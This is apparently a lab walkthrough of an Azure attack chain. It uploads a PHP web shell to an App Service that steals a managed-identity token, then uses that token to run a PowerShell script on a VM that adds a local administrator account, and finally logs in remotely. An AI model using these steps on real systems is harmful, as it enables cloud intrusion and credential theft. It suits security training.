# Initial Access - Execute Command On VMs
***Part of - Kill Chain - 1***   
   
   
![test](/img/app_server_abuse_1.png "Initial Access via App Service Abuse")

1. Upload `studentxtoken.phtml` file 
  ```php
  <?php 
  system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
  ?>
  ```
2. Go to the uploaded URL `http://defcorphqcareer.azurewebsites.net/uploads/student31token.phtml`
  ![test](/img/access.png "Initial Access via App Service Abuse")
3. Check the resources available to the managed identity (using the access token and client ID)
    ```powershell
    Connect-AzAccount -AccessToken $token -AccountId $account_id
    Get-AzResource
    ```
    We can use the access token and client ID from above with Az PowerShell. 
    ![test](/img/access_2.png "Initial Access via App Service Abuse")
4. Enumerate the VM that we can access PublicIP address via below commmand;
    ```powershell
    Get-AzPublicIpAddress -Name bkpadconnectIP
    ```
    ![test](/img/access_3.png "Initial Access via App Service Abuse")
5. Once we have access rights on the Azure VMs that means we can execute a command remotly via `Invoke-AzVMRunCommand`
    ```powershell
    Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
    ```

    The script of `adduser.ps1` is down below;

    ```powershell
    $passwd = ConvertTo-SecureString "Stud31Password@123" -AsPlainText -Force
    
    New-LocalUser -Name student31 -Password $passwd 
    Add-LocalGroupMember -Group Administrators -Member student31
    ```
    Once executed this script the output is shown below;
    
    ![test](/img/access_4.png "Initial Access via App Service Abuse")
6. Now we can access the VMs via `PSRemoting`;
    ```powershell
    $Password = ConvertTo-SecureString "Stud31Password@123" -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('student31',$Password)
    $sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption) -ProxyAccessType NoProxyServer)
    Enter-PSSession $sess
    ```
    
    ![test](/img/access_4.png "Initial Access via App Service Abuse")





